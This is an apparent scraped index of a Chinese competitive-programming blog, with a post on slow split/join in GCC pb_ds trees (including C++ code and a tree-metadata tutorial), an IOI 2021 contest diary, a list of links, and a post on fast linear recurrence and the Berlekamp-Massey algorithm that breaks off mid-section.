那個節點，因為我不知道怎麼把 splay 寫在 std::distance 裡面所以只好在 split 完之後用 find 來間接呼叫 splay。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/extc++.h\u0026gt; #include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; using namespace __gnu_pbds; using BST = tree\u0026lt;int, null_type, less\u0026lt;int\u0026gt;, splay_tree_tag, tree_order_statistics_node_update\u0026gt;; using BST_Itr = BST::iterator; // overload std::distance for BST for efficiently split namespace std { template\u0026lt;\u0026gt; iterator_traits\u0026lt;BST_Itr\u0026gt;::difference_type distance(BST_Itr begin, BST_Itr end) { if (begin == end) return 0; auto it = begin.m_p_nd; // jump until root while (it-\u0026gt;m_p_parent-\u0026gt;m_p_parent != it) it = it-\u0026gt;m_p_parent; // returns the size for the whole tree (only for split) return it-\u0026gt;get_metadata(); } } void splayAfterSplit(BST \u0026amp;bst) { if (bst.empty()) return; bst.find(*bst.begin()); } signed main() { BST A, B, C; int n = 100000; for (int i = 0; i \u0026lt; n; i++) { int x = rand(); A.insert(x); } long long ans = 0; for (int i = 0; i \u0026lt; n; i++) { int l = rand(); int r = rand(); if (l \u0026gt; r) swap(l, r); // query (l, r] A.split(l, B); B.split(r, C); splayAfterSplit(A); splayAfterSplit(B); splayAfterSplit(C); ans += B.size(); B.join(C); A.join(B); } cout \u0026lt;\u0026lt; ans \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } rb_tree 而在 std::distance 複雜度是好的前提下，使用 rb_tree_tag 的 tree split 的複雜度應該就會是 $\\mathcal{O}(\\log^2 N)$ 了，但不知道是兩個 $\\log$ 就這麼慢還是有哪裡又有問題了，上面同樣1e5次的split+join開 Ofast 還是要跑大概五秒。\n鑑於兩個 $\\log$ 無法在氣球博覽會取得 AC ，我們有另外一種可以避免 split 而解決區間詢問的方式。\n只要在 metadata 維護這個子區間的最左端與最右端就能有與遞迴式線段樹類似的寫法了，一次詢問的複雜度應該是 $\\Theta(\\log N)$ 吧。醜醜又長長的 code 如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 #pragma GCC optimize(\u0026#34;Ofast\u0026#34;) #include \u0026lt;bits/stdc++.h\u0026gt; #include \u0026lt;bits/extc++.h\u0026gt; using namespace std; const int maxn = 200025, inf = 1e9; struct info { int ans, mn, mx; pair\u0026lt;int,int\u0026gt; lmost, rmost; info () : ans(-inf), mn(-inf), mx(inf), lmost(), rmost() {} info (int c, int x) : ans(0), mn(x), mx(x), lmost(c, x), rmost(c, x) {} friend info operator+(const info \u0026amp;lhs, const info \u0026amp;rhs) { if (lhs.ans \u0026lt; 0) return rhs; if (rhs.ans \u0026lt; 0) return lhs; info res; res.ans = max({ lhs.ans, rhs.ans, rhs.mn - lhs.mx }); res.mn = min(lhs.mn, rhs.mn); res.mx = max(lhs.mx, rhs.mx); res.lmost = lhs.lmost; res.rmost = rhs.rmost; return res; } }; template\u0026lt;class Node_CItr, class Node_Itr, class Cmp_Fn, class _Alloc\u0026gt; struct my_node_update { private: using Key = pair\u0026lt;int,int\u0026gt;; info query(Node_CItr it, Key L, Key R) { if (it == node_end()) return info(); if (L \u0026lt;= it.get_metadata().lmost \u0026amp;\u0026amp; it.get_metadata().rmost \u0026lt; R) return it.get_metadata(); Key key = **it; if (key \u0026gt;= R) return query(it.get_l_child(), L, R); if (key \u0026lt; L) return query(it.get_r_child(), L, R); return query(it.get_l_child(), L, R) + info((*it) -\u0026gt; first, (*it)-\u0026gt;second) + query(it.get_r_child(), L, R); } public: typedef info metadata_type; void operator()(Node_Itr it, Node_CItr end_it) { info res((*it) -\u0026gt; first, (*it) -\u0026gt; second); Node_Itr lc = it.get_l_child(); Node_Itr rc = it.get_r_child(); if (lc != end_it) res = lc.get_metadata() + res; if (rc != end_it) res = res + rc.get_metadata(); const_cast\u0026lt;metadata_type\u0026amp;\u0026gt;(it.get_metadata()) = res; } info query(Key L, Key R) { return query(node_begin(), L, R); } virtual Node_CItr node_begin() const = 0; virtual Node_CItr node_end() const = 0; }; using BST = __gnu_pbds::tree\u0026lt;pair\u0026lt;int,int\u0026gt;, __gnu_pbds::null_type, less\u0026lt;\u0026gt;, __gnu_pbds::rb_tree_tag, my_node_update\u0026gt;; BST tr; int a[maxn]; signed main(){ ios_base::sync_with_stdio(0),cin.tie(0); int n, q, C; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; q \u0026gt;\u0026gt; C; for (int i = 0; i \u0026lt; n; i++) cin \u0026gt;\u0026gt; a[i]; for (int i = 0; i \u0026lt; n; i++) tr.insert({ a[i], i }); for(int i = 0; i \u0026lt; q; i++){ int t; cin \u0026gt;\u0026gt; t; if (t == 0) { int x, k; cin \u0026gt;\u0026gt; x \u0026gt;\u0026gt; k; tr.erase({ a[x], x }); a[x] = k; tr.insert({ a[x], x }); } else { int l, r, k; cin \u0026gt;\u0026gt; l \u0026gt;\u0026gt; r \u0026gt;\u0026gt; k; auto res = tr.query({ k, l }, { k, r }); if (res.ans \u0026lt; 0) cout \u0026lt;\u0026lt; r - l \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; else cout \u0026lt;\u0026lt; max({ res.ans, r - res.mx, res.mn - l + 1 }) - 1 \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } } } 其實這樣的 code length 還有要記得的東西已經長到可以提出「這跟自己寫平衡樹不是差不多嗎？」的疑問了，實在蠻可惜的，號稱 high-performance ，然後寫這麼多東西還是比一大堆人寫的 treap 慢（也可能只是我笨笨才會 code 這麼長 QQ）。\n我覺得如果 pbds 沒有這幾個函數或是複雜度很爛倒不是什麼大問題，畢竟 STL 肥也不是一天兩天的事情了，在競賽自己寫資結也不是不行，但是官網上的說明應該要改掉QQ\nAppendix: metadata 為了怕大家聽不懂覺得心癢癢，來講怎麼什麼是 metadata 還有怎麼自己維護 metadata。\n如果想自己研究可以看 document。\nmetadata 是我們可以自訂的在每個節點儲存的有關它整個子樹的資訊，方便說明會用以下的問題作為舉例。\n有 $N$ 個操作，每個操作可能是把一個整數加進集合裡面，或是詢問數字大小介於 $[l, r)$ 之內的數字總和。保證不會有已經在集合裡面的數字被加進去（i.e.數字全部相異）\n我們將會使用下面這樣的 tree。\n1 2 using namespace __gnu_pbds; using BST = tree\u0026lt;int, null_type, less\u0026lt;int\u0026gt;, rb_tree_tag, my_node_update\u0026gt;; my_node_update 是一個我們自行撰寫的型別：\n1 2 3 4 5 6 7 8 9 10 11 12 template\u0026lt;class Node_CItr, class Node_Itr, class Cmp_Fn, class _Alloc\u0026gt; struct my_node_update { typedef long long metadata_type; void operator()(Node_Itr it, Node_CItr end_it) { // ... } long long query(int x) { // ... } virtual Node_CItr node_begin() const = 0; virtual Node_CItr node_end() const = 0; }; 其中，metadata_type 是每個節點維護的資訊的型別，Node_CItr 和 Node_Itr 分別是 const 的節點迭代器與節點迭代器，值得注意的是這種迭代器是指向迭代器的迭代器，也就是說 *it 的型別會是 tree::iterator 之類的，兩種迭代器有所不同（it與tree::begin()型別是不同的！）。\nvoid operator()(Node_Itr it, Node_CItr end_it) 方法有點類似 pull 的角色，當這個函式被呼叫，保證 it 的左小孩與右小孩的 metadata 都已經是正確的了，而你必須重新計算 it 的 metadata。it.get_l_child() 和 it.get_r_child() 分別是 it 的左小孩與右小孩，而如果左(右)小孩不存在則會設成與 end_it 相同。\n我們可以這樣寫：\n1 2 3 4 5 6 7 8 9 10 void operator()(Node_Itr it, Node_CItr end_it) { long long res = **it; Node_CItr lc = it.get_l_child(); Node_CItr rc = it.get_r_child(); if (lc != end_it) res = lc.get_metadata() + res; if (rc != end_it) res = res + rc.get_metadata(); const_cast\u0026lt;metadata_type\u0026amp;\u0026gt;(it.get_metadata()) = res; } node_begin() 會回傳一個代表根的節點迭代器，而 node_end() 則是回傳一個代表空節點的節點迭代器（任何葉子節點的小孩都會是 node_end()）。\n我們希望 query(x) 回傳所有 $ \u0026lt; x$ 的數字總和，因此可以撰寫 my_node_update::query 如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 long long query(int x) { long long result = 0; Node_CItr it = node_begin(); while (it != node_end()) { int key = **it; if (key \u0026lt; x) { result += it.get_l_child().get_metadata(); result += key; it = it.get_r_child(); } else { it = it.get_l_child(); } } return result; } 所有 my_node_update 的 public 方法都可以在使用 my_node_update 的 tree 直接使用，因此我們可以直接像下面這樣使用我們定義完的 BST 型別。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 signed main() { ios_base::sync_with_stdio(0), cin.tie(0); int N; cin \u0026gt;\u0026gt; N; BST bst; for (int i = 0; i \u0026lt; N; i++) { string type; cin \u0026gt;\u0026gt; type; if (type == \u0026#34;QUERY\u0026#34;) { int l, r; cin \u0026gt;\u0026gt; l \u0026gt;\u0026gt; r; cout \u0026lt;\u0026lt; bst.query(r) - bst.query(l) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } else if (type == \u0026#34;ADD\u0026#34;) { int x; cin \u0026gt;\u0026gt; x; bst.insert(x); } } } 參考資料/延伸閱讀 https://zouzhitao.github.io/posts/pbds/\nhttps://gcc.gnu.org/bugzilla/show_bug.cgi?id=81806\nhttps://www.luogu.com.cn/blog/Chanis/gnu-pbds\nhttps://github.com/baluteshih/baluext/blob/main/baluext.h\n有任何筆誤請通知 m(_ _)m\n","permalink":"https://omeletwithoutegg.github.io/2021/07/23/pbds-split-join-is-slow/","tags":["binary-tree","data-structure","cpp","splay-tree"],"title":"PBDS Split Join Is Slow"},{"contents":"IOI 2021 只是想打一下IOI的心得而已\n可能還是流水帳請多多包含(?)\nBefore 其實到二模都還很擔心會不會當上國手，還有擔心自己的實力到底有沒有變強\n因為一模是因為靠奇怪互動線性遞迴的題目才上去，啊二模唯一寫出來的題目也是IOI根本不考的東西\n另外很好笑的是我這學期比前兩個學期還努力追學分，因為之前太混了XD這學期剛好要全部過才夠畢業的學分竟然夠了\n謝謝所有即使我交作業很混還是讓我過的老師!\n四模拿了一個不錯看的分數，如果我在國手線下150分甚至可以抵回來(?)因為這件事我大概可以claim二階很好追分(並沒有)\n因為疫情的關係國培燒雞，我超期待的說，還想說今年想再寫一次國培紀錄QQ\n唯一比較算是訓練的東西是tmt(卡恩)和我們google meet討論一些題目\n第一次meet的時候是先丟題目討論，然後也講了去年的模考題，像是expected LCS那題好像就是暴力DP(雖然我不知道複雜度是什麼)\nZCK真的超級積極，丟了好多POI或是JOI、CSAcademy的題目，好多題目我都是第一次見\n基本上沒有什麼想法，不過就算只是聽解也蠻困難的，有一些證明因為卡恩也是當場想所以有點久，我也沒注意聽就做自己的事了XD\n第二次meet主要討論IOI2019，有事前看過題目之後感覺就好一點了(?)不過因為一直想要把line得多一點分所以也沒有太專心(X\n感謝卡恩與zisk讓我腦袋有在動(?)\nDay0 看到好久沒看到的ZCK與wiwi還有(隔著口罩)呼吸到新鮮空氣心情還不錯\n晚上是練習賽\n題目都跟去年一樣\n唯一不一樣的是一題BFS\n結果還不能破台，好好笑\n不過差點在賽中因為唬爛弄出正解(?)\n結束之後問了一下ZCK解，果然他會只是剛好在兩小時的最後才想到(?)\nDay1 day1前一天打了一場div.2寫完ABCD看完F猜他的式子很漂亮就亂推AC了 然後E寫好久總算寫完\n這讓我感覺狀態還不錯，對我來說可能寫水題也是一個穩定心情的方法(?)\n我們三個人還有監考人員占用一整個會議室，間隔開來坐\n原本是用acer的筆電但是後來變成msi的樣子，因為好像跑比較快\n開賽的時候先打了模板\nZCK帶來的鍵盤的聲音來讓人滿是壓力XD\n然後看紙本題目想\n然後\u0026hellip;就沒有然後了\nparks看起來有點困難先放著了一下\ncandies看起來就很經典題，而keys也是沒有什麼想法\n一直畫圖交替想兩題，大概花了一小時還是沒有什麼想法\n三個人維持了安靜好久，然後ZCK開始動鍵盤的時候有夠可怕\n只好姑且先去撈分，撈了keys的基本分跟candies的一點分數\n仔細看了parks發現可以弄成類似2SAT的東西不過實作異常麻煩，而且我也忘記tarjan怎麼寫甚至跑去寫kosaraju(?)\n不過花了好久拿到了70分，我覺得還算值得\n接下來就繼續把candies的分數撈一撈，有一個subtask似乎是我唬爛得到的分數賽後才發現，唬爛就是爽\n最後一直在想candies $l=0, r=n-1$ 的subtask就結束了\n結束之後有點怕自己又是銅牌命，趕快問分數，結果大家都一樣好好笑，而且都是銀牌左右的分數，看來 day1 實在蠻難的\nDay2 day1/2中間似乎吃了雙豚還是山嵐\nday2前一天因為睡不著跑去看了IOI2014之類的，然後發現做不出來趕快看解以免影響比賽，好好笑\n心中不想太多的雜事，很快就開賽了\n打完模板開始讀題目，然後就遇到很欠嘴砲的水題(?)大概在25分鐘內就AC了，有點帶給我小小信心(X\n剩下兩題開始讀\nregisters實在有點長，當然只能先去看dungeons\n因為想說贏了好像強度就會加倍，所以原本想說只會贏log次，寫到一半突然覺得怪怪\n後來發現應該是「贏了輸過的人的話那麼強度會加倍」，然後就不知道怎麼做了\n跑去讀registers題敘發現實在超級長，結果是要實作取min跟排序，感覺就是跟19的vision或是12的odometer這種題一樣噁心\n想一想覺得應該可以做很多平行化，而且去年的國培蔡孟宗甚至還講過平行化的bitonic sort，結果今年沒國培，好慘\n先做了取min的subtask，實作比較的方式我是先做減法，然後就可以有絕對值，就有min了\n平行化大概需要170個操作左右，和最後一個subtask要求150只差一點但是怎麼都壓不過，傷心\n後來看著dungeons一直想他怎麼樣會加倍，突然就想到2的冪次分層\n也就是說如果現在的強度 $z\\in[2^i,2^{i+1})$ 就說現在在第 $i$ 層，那一定會輸 $2^{i+1}$ 以上的人、贏 $2^i$ 以下的人，而一旦贏了中間的人就會跳到下一層!\n啊待在某一層的時候一定是一直輸大的、贏小的直到贏了一個大的，因為是一張functional graph所以可以用倍增法\n總之整理了一下寫寫倍增法就有了時間 $(n+q)\\log^2C$ 空間 $n\\log^2C$ 的解，不過 $n=400000$ 開不下，開 $n=50000$ 丟上去六十幾分覺得還不錯\n後來測了一下發現記憶體少一點就可以開得下了，所以嘗試壓常(?)原本想說用分根號、立方根的，後來發現可以開到 $10n\\log C$ 的記憶體就想說可以一次跳 $(10^7)^{\\frac{1}{10}}$ 倍，然後一直亂改改就 AC 了??\n這應該是第一次在賽中遇到二的冪次分層，實在覺得出出這些題目的人都很厲害\n比賽最後在努力修改 registers 的情況下結束，可惜沒有再撈到分數\n比賽結束的時候聽到ZCK跟balbit分數都沒有很好，覺得很可惜，而且看到scoreboard大家的名次都在30~40名內，真的覺得有夠可惜qwq\n原本想說自己會銀牌，沒想到看scoreboard竟然有30名內，還真的是很開心\n真的是很有趣，因為聽說我的dungeons的空間是壓常而不是預期複雜度，因為壓常而得金實在是沒有想到XD\n不過就很好奇到底怎麼不用倍增法或是HLD在functional graph上面做類似二分搜的事情了OAO，我只能理解可以用HLD讓空間是 $\\mathcal{O}(n)$ 但是HLD可是超出IOI syllabus的(?)\n晚上買了sukiya，好感動。\nAfter 對於一開始的擔心，我覺得可能是有道理的，我們幾個人的實力和一年前比起來一定都有成長，但題目和其他選手也都比去年的他們厲害，我想能得到金牌無非還是一種好運吧！一個人的實力是一個浮動的區間，剛好想到怎麼壓常也是一種緣分吧\n在二階左右的時候常用的筆電被我不小心摔壞了螢幕，現在先用暫時用的筆電，還好我的部落格好好放在github上可以好好修改(?)\n我覺得IOI有點是給我一個理由耍廢不做事有點心虛\n最近又有好多事情要做，例如趕完APCS camp的投影片XD 不過這樣也好，人生不找點事情做會無聊死，忙著不去胡思亂想還好多了。\n最近和ot他們第一次團練ICPC，感覺我有夠菜，希望能好好融入他們\n本來想這篇心得要不要打得像是 baluteshih 那篇心得一樣長，不過我好像不擅長鋪陳也不擅長回想所以就作罷了吧\n好久沒有更新部落格了，大概慢慢就不太更新了吧\n","permalink":"https://omeletwithoutegg.github.io/2021/07/01/IOI2021/","tags":["IOI","experience"],"title":"IOI2021"},{"contents":"外部資源 一些其他人的 blog 友情（？）連結\nhttps://www.jikuai.dev/ https://blog.simbafs.cc/ https://littlecube8152.github.io/ https://blog.forvkusa.csie.org/ https://yunxiurz.github.io/ https://tmt514.github.io/ https://tmt514.github.io/algorithm-analysis/ https://sunmoon-template.blogspot.com/ https://abc864197532.github.io/ https://pixelcat31415.github.io/ https://alvingogo.github.io/ https://caidocode.blogspot.com/ https://the-coding-pooh.github.io/ 年久失修（？）的 blog 我的 blog 隨時也會年久失修。\nhttps://www.wiwiho.me/ https://baluteshih.blogspot.com/ https://brian.su/ https://cbdcoding.blogspot.com/ https://oi.ototot.tw/ https://blog.nerde.pw/ https://ltf0501.github.io/ https://sorahisa.github.io/ https://blog.nella17.tw/ https://casperwang.pages.dev/ https://fhvirus.github.io/ https://erdone.github.io/ https://emanlaicepsa.github.io/ https://hiiragi4000.blogspot.com/ 一些隨機的外國資料 https://shanlunjiajian.github.io/ https://zhoukangyang.blog.uoj.ac/ https://github.com/enkerewpo/OI-Public-Library/tree/master/IOI%E4%B8%AD%E5%9B%BD%E5%9B%BD%E5%AE%B6%E5%80%99%E9%80%89%E9%98%9F%E8%AE%BA%E6%96%87 https://ei1333.github.io/ https://www.mathenachia.blog/ https://rsk0315.github.io/ https://rsk0315.github.io/playground/gutcha.html https://maspypy.com/ https://noshi91.hatenablog.com/ https://blog.shift.moe/ https://www.comp.nus.edu.sg/~stevenha/ https://visualgo.net/en https://cpbook.net/ https://thisisadi.yoga/ICPC/ https://byvoid.com/zht/ https://zhuanlan.zhihu.com/p/697429479 （有空的話 dump 內容出來） 一些網站 NTUCPC Guide OI checklist CF, TIOJ, AtCoder USACO Guide OI wiki Universal Cup Library Checker 一些工具 Draw Graph is-my-problem-new Asia Pacific site score table TWPCA 區域賽記分板紀錄 vim、vim-plug ","permalink":"https://omeletwithoutegg.github.io/resources/","tags":[],"title":"Resources"},{"contents":"本篇將會介紹快速求線性遞迴數列某項的方法，以及Berlekamp-Massey演算法和一些在矩陣上的應用。\n主要是一個整理資料還有學習筆記的功能，還有老實說這東西算是偏門又毒瘤，追求實用的人不要看XD。\nFast Linear Recurrence 首先先來介紹如何快速求線性遞迴。\n定義 已知序列 $ \\langle a_n \\rangle $ 滿足遞迴關係 $ \\displaystyle \\forall i \\geq k, a_i = \\sum _ {j=0} ^ {k-1} s _ j a _ {i-1-j} $ ，並且已經給定 $s$ 跟 $a_0, a_1, \\dots, a _ {k-1}$\n現在想要求 $ a_n $ 的值，其中 $ 1 \\leq k \\leq 5000, 0 \\leq n \\leq 10^9 $\n許多人大概會很快想到矩陣快速冪，複雜度是 $ \\mathcal{O}(k^3 \\log n) $。但我們要更快！\n通靈 定義一個函數 $G$，對於形式冪級數 $f(x) = \\sum c_i x^i, G(f) = \\sum c_i a_i$ 。\n顯然$G(f \\pm g) = G(f) \\pm G(g)$。\n根據 $s$ 構造一個多項式 $S$\n$$\nS(x) = x^k - \\sum _ {i=0} ^ {k-1} s_i x^{k-1-i}\n$$\n可以發現 $G(S) = 0$，因為代進去正好是 $a_i - \\sum\\limits _ {j=0} ^ {k-1} s _ j a _ {i-1-j} = 0 $。\n而且，平移之後也會滿足遞迴關係，所以 $G(Sx) = G(Sx^2) = \\dots = 0$。\n由上面兩條可以得知，對於任何多項式$f$都有$G(Sf) = 0$。\n我們想求的第$n$項，正好就是$G(x^n)$，不妨取 $\\displaystyle f = \\lfloor \\frac{x^n}{S} \\rfloor$，則$G(x^n) = G(x^n - Sf) = G(x^n \\mod S)$。\n上述$\\lfloor \\frac{x^n}{S} \\rfloor$ 和 $x^n \\mod S$ 分別是多項式帶餘除法的商和餘數。\n結論 證明也很快。\n總而言之，只要求得$x^n \\mod S$（注意這個東西的degree是$\\mathcal{O}(k)$），再帶進$G$就能得到 $a_n$！\n可以對$n$做類似快速冪的事情，每次算$x^{n/2} \\cdot x^{n/2} \\mod S$之類的，如果是mod質數的話，甚至可以利用FFT或是NTT來快速多項式帶餘除法作到總複雜度 $\\mathcal{O}(k\\log k \\log n)$，不過超出今天的篇幅所以這邊只放$\\mathcal{O}(k^2 \\log n)$的寫法。\n老實說$\\mathcal{O}(k^2)$的$\\mod S$比想像中好寫，只要從大到小不斷把$x^k$換成$ \\sum\\limits _ {i=0} ^{k-1} s_i x^{k-1-i}$ 就好\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 template \u0026lt;typename T\u0026gt; T fastLinearRecurrence(vector\u0026lt;T\u0026gt; a, vector\u0026lt;T\u0026gt; s, int n) { if (n \u0026lt; (int)a.size()) return a[n]; if (s.empty()) return 0; // a 是前 k 項， s是遞迴關係， // a[i] = \\sum s[j] * a[i-j-1] vector\u0026lt;T\u0026gt; r = {1}; // 1 vector\u0026lt;T\u0026gt; e = {0, 1}; // x; auto mul = [\u0026amp;s](vector\u0026lt;T\u0026gt; a, vector\u0026lt;T\u0026gt; b) { // return a * b % (x^k - s) vector\u0026lt;T\u0026gt; c(a.size() + b.size() - 1); for (size_t i = 0; i \u0026lt; a.size(); i++) for (size_t j = 0; j \u0026lt; b.size(); j++) c[i+j] += a[i] * b[j]; for (size_t i = c.size()-1; i \u0026gt;= s.size(); i--) for (size_t j = 0; j \u0026lt; s.size(); j++) c[i-j-1] += c[i] * s[j]; c.resize(s.size()); return c; }; while (n) { if (n \u0026amp; 1) r = mul(r, e); e = mul(e, e); n \u0026gt;\u0026gt;= 1; } T sum = 0; for (size_t j = 0; j \u0026lt; r.size(); j++) sum += r[j] * a[j]; return sum; } 上面的T可以是double或是自定義的同餘算術型別。\n不過這其實有點不太實用。通常這種線性遞迴數列的遞迴式基本上長度都是超小的常數，而需要交給電腦推的遞迴式通常都是形如$v _ i = A^i v _ 0$的形式，也就是說有很多個狀態要一起考慮，沒辦法想成單一變數的線性遞迴形式，矩陣快速冪的通用性還是比較高。後面也許會提到這種東西要怎麼算得比矩陣快速冪還快，不過如果$A$不是稀疏的也只是少一個$\\log$而已。\nBerlekamp-Massey 演算法 這東西可神奇了，可以說是弱化版的OEIS。不過還有很多神奇的應用。\n以下簡稱Berlekamp-Massey演算法為BM演算法。\n定義 給定一個序列 $ a_0, a_1, \\dots, a _ {n-1} $ ，請找出一個階數最小的線性遞迴關係 $ \\langle s _ i \\rangle $ ，\n使得 $ \\forall i \\geq k, a_i = \\sum\\limits _ {j=0} ^ {k-1} s _ j a _ {i-1-j} $。其中 $k$ 即是此線性遞迴關係的階數。\n當然，求出來的遞迴關係可能不是是唯一解，也不知道能不能對應到原本的遞迴式。\n不過可以證明，如果已知遞迴式的階數最多是 $k$ 的話，只要取前 $2k$ 項求解得到一個遞迴關係之後，任何更長的前綴都會吻合該關係，也就是說該關係是整個無限數列的最短遞迴式。\n證明請看2019 IOI中國國家隊論文\u0026hellip;\n步驟 BM演算法包含了一些迭代法跟greedy的思維。我們由短到長逐步考慮每個前綴 $[0 .. i]$ ，假如第 $i$ 個數字加進去之後和舊的遞迴關係不吻合，我們就修正該遞迴關係。一開始遞迴式 $s$ 初始化為空。\n修正的部份可以分成兩個case：\n不是第一次修正。\n假設這次誤差叫做 $\\varepsilon$ 好了，也就是 $a_i - \\sum _ {j=0} ^ {k-1} s _ j a _ {i-1-j} = \\varepsilon$\n因為不是第一次修正，所以設之前有一次是在加入第 $i\u0026rsquo;$ 個數字後修正的，該次修正之前的遞迴式為$s\u0026rsquo;$，誤差為 $\\varepsilon\u0026rsquo;$。也就是說，$a _ {i\u0026rsquo;} - \\sum _ {j=0} ^{k\u0026rsquo;-1} s\u0026rsquo; _ j a _ {i\u0026rsquo;-1-j} = \\varepsilon\u0026rsquo;$\n可以發現，$\\frac{\\varepsilon}{\\varepsilon\u0026rsquo;} (a _ x - \\sum _ {j=0} ^ {k\u0026rsquo;-1} s\u0026rsquo; _ j a _ {x-1-j})$是一個僅在 $x = i\u0026rsquo;$ 是 $\\varepsilon$，其他位置是 $0$ 的序列。在 $s\u0026rsquo;$ 前面補 $0$ ，使得前面的項都不會被影響到，而第 $i$ 項恰好對到 $\\varepsilon$ 那一項，如此兩者相消就能讓第 $i$ 項的誤差變為 $0$ 。也就是說，如果當前的 $s$ 出錯了，我們就會把 $s$ 加上「之前某次的 $s\u0026rsquo;$ 乘上若干倍再平移」以修正該次的誤差。\n總之就是取前面算過的東西拿來消掉新加入的項的誤差啦。至於 $i\u0026rsquo;$ 的取法似乎是要讓要補的 $0$ 盡量少，最後的結果才會是最短的遞迴式。\n在下面的 code 中， bestPos維護的是最好的 $i\u0026rsquo;$ ； best 維護的是最好的 $s\u0026rsquo;$ ，取負號之後前面補 $1$ ，然後除以 $ \\varepsilon\u0026rsquo; $ 第一次修正\n表示 $i$ 是第一個非零元素，將 $s$ 修正為 $i+1$ 個 0 ，表示前 $i+1$ 項應該會是在給定的 $k$ 項之中。\nbest 更新成單項式 $1 / \\varepsilon$ 總之code雖然很簡潔，但好難懂\u0026hellip;\n複雜度是 $\\mathcal{O}(n^2)$。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 template \u0026lt;typename T\u0026gt; vector\u0026lt;T\u0026gt; BerlekampMassey(vector\u0026lt;T\u0026gt; a) { auto scalarProduct = [](vector\u0026lt;T\u0026gt; v, T c) { for (T \u0026amp;x: v) x *= c; return v; }; vector\u0026lt;T\u0026gt; s, best; int bestPos = 0; for (size_t i = 0; i \u0026lt; a.size(); i++) { T error = a[i]; for (size_t j = 0; j \u0026lt; s.size(); j++) error -= s[j] * a[i-1-j]; if (error == 0) continue; if (s.empty()) { s.resize(i + 1); bestPos = i; best.push_back(1 / error); continue; } vector\u0026lt;T\u0026gt; fix = scalarProduct(best, error); fix.insert(fix.begin(), i - bestPos - 1, 0); if (fix.size() \u0026gt;= s.size()) { best = scalarProduct(s, - 1 / error); best.insert(best.begin(), 1 / error); bestPos = i; s.resize(fix.size()); } for (size_t j = 0; j \u0026lt; fix.size(); j++) s[j] += fix[j]; } return s; } BM 演算法的應用！ 方便起見，接下來會用SLR簡稱「最短遞迴式」。\n終於來到我最想分享的部份。前面code可以直接當模板抄啦，就跟Dinic一樣神秘。\n但是重點在於怎麼活用BM演算法。BM演算法對於矩陣，尤其是稀疏矩陣的相性特別好。\n這裡大部分都是IOI 2019中國國家隊的論文來的www\n向量/矩陣的SLR 一些 $n$ 維向量 $ \\{ v_0, v_1, \\dots, v _ {n-1} \\} $ 的SLR怎麼求？答案是隨機生成一個向量 $u$ 跟他做內積，改求 $ \\{ u^T v_0, u^T v_1, \\dots, u^T v _ {t-1} \\} $ 的 SLR。可以證明乘上 $u$ 之後，SLR不變的機率至少是 $1 - \\frac{n}{p}$ （$p$ 是模的質數）。類似的，一些 $m \\times n$ 矩陣 $ \\{ A_0, A_1, \\dots, A _ {t-1} \\} $ 的 SLR 求法就是生成隨機向量 $u, v$ 拿去左邊右邊乘，改求 $ \\{ u^T A_0 v, u^T A_1 v, \\dots, u^T A _ {t-1} v \\} $的SLR。正確的機率似乎至少是 $1 - \\frac{n+m}{p}$ 。\n證明用到了一個我完全不會的 Schwartz-Zippel 引理。哪那麼衰XD\n稀疏線性方程組 求解 $Ax = b$ 即是想得到 $x = A^{-1}b$ 。考慮 $ \\{ A^0b, A^1b, A^2b \\dots, \\} $ 的SLR，可以得知\n$ A^kb = \\sum _ {i=0} ^ {k-1} s _ {k-1-i} A^ib $。兩邊同乘 $A^{-1}$ 並移項之後可以得出\n$$\nA^{-1}b = -\\frac{1}{s _ {k-1}}(A^{k-1}b - \\sum _ {i=1} ^ {k-1} s _ {k-1-i} A^{i-1}b)\n$$\n注意到 $s _ {k-1} \\neq 0$，否則他就不可能是最短。\n如果 $A$ 是稀疏的，裡面有 $e$ 個非零元素，那麼依序推出 $ A^0b, A^1b, \\dots, A^{2n-1}b$ 就只需要 $\\mathcal{O}(n(n+e))$。\nIOICAMP似乎有一題可以用這個搶topcoder\n稠密的轉移矩陣 在前面某一段有提到，轉移長度如果不是很小的常數的話，常常會寫成像是 $v_i = A^iv_0$ 的形式，其中 $A$ 是 $n$ 階方陣而 $v_i$ 是 $n$ 維向量，我們想求的是 $v_k$。\n直接利用矩陣快速冪的方法是 $n^3 \\log k$ 的。不過，我們只需要求出前 $2n$ 項的SLR，再利用前述的 fast linear recurrence 就能得到第 $k$ 項。（不過可能要稍微改寫一下求出$x^k \\mod f$之後帶進$G$的部份）可以依序求出 $v_0, v_1, \\dots, v _ {2n-1}$，複雜度 $\\mathcal{O}(n^3)$，後面的fast linear recurrence複雜度大概是 $\\mathcal{O}(n^2\\log k)$之類的。\n例題可以去試試TIOJ 1892 owo\n矩陣的最小多項式 一個 $n\\times n$ 方陣 $A$ 的最小多項式是 degree 最小的 $p$ 使得 $p(A) = 0$ 。By Cayley Hamilton theorem，特徵多項式正好也是一個多項式 $p$ 使得 $p(A) = 0$ ，所以最小多項式的 degree 至多是 $n$。\n如何求？最小多項式 $p(A) = \\sum c_i A^i$ ，可以發現只要求 $ \\{ A^0, A^1, A^2, \\dots \\} $ 的 SLR 就能得到最小多項式。又，最小多項式至多 $n$ 項，故取前 $2n$ 項計算即可得到答案。\n稀疏矩陣行列式 